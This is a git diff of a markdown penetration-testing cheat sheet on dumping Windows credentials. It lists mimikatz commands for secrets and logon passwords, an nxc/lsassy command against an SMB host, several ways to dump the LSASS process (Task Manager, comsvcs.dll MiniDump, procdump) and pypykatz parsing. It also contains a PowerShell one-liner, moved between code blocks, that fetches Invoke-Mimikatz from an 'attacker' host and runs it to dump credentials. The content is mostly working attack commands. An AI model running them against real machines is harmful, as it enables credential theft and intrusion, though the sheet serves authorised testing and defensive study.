@@ -68,9 +68,9 @@ mimikatz.exe "privilege::debug" "lsadump::secrets" exit
 
 ## **LSASS**
 
-### Automated
-
 **LSASS** (Local Security Authority Subsystem Service) is a Windows process responsible for enforcing security policies, handling logins, password changes, and generating access tokens. It stores live credentials in memory (e.g., passwords, hashes, tickets) for logged-in users
+
+### Automated
 
 ```bash
 nxc smb 10.10.10.10 -u administrator -p Password123 -M lsassy
@@ -86,7 +86,7 @@ mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
 
 Using GUI
 
-`Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process > `Select Create dump file`
+`Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file`
 
 Using CLI
 
@@ -102,13 +102,12 @@ Create dump file
 ```shell
 rundll32 C:\windows\system32\comsvcs.dll, MiniDump 668 C:\lsasspower.dmp full
 procdump -accepteula -ma lsass lsass.dmp
-powershell IEX (New-Object System.Net.Webclient).DownloadString('http://attacker/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
 ```
 
 Using `mimikatz`
 
 ```bash
-sekurlsa::minidump lsass.dmp
+mimikatz.exe "sekurlsa::minidump lsass.dmp" exit
 ```
 
 #### Extracting secretes
@@ -116,7 +115,8 @@ sekurlsa::minidump lsass.dmp
 Extract credentials with [pypykatz](https://github.com/skelsec/pypykatz)
 
 ```bash
-pypykatz lsa minidump ./lsass.dmp 
+pypykatz lsa minidump ./lsass.dmp
+powershell IEX (New-Object System.Net.Webclient).DownloadString('http://attacker/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
 ```
 
 ## **Stored credentials**
